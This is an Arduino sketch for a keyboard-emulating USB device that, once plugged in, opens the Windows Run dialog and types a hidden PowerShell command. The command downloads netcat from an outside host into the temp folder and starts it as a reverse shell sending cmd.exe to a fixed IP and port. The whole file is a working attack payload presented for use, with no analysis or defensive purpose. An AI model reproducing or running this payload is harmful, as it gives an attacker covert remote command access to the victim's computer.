#include "Keyboard.h"

void typeKey(uint8_t key){
	Keyboard.press(key);
	delay(50);
	Keyboard.release(key);
}

/* Init function */
void setup(){
	// Begining the Keyboard stream

	Keyboard.begin();

	delay(4000);

	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.press('r');

	Keyboard.releaseAll();

	delay(1000);

	Keyboard.print("powershell -windowstyle hidden \"$a = (\\\"{0}\\nc.exe\\\" -f $(get-item hkcu:\\Environment).GetValue('tmp')); (new-object System.Net.WebClient).DownloadFile('https://nemanja.top/nc/nc.exe', $a); Start-Process $a -ArgumentList '-d -e cmd.exe 192.168.1.254 8181'\"");

	typeKey(KEY_RETURN);

	delay(400);
	
	Keyboard.end();
}

/* Unused endless loop */
void loop() {}
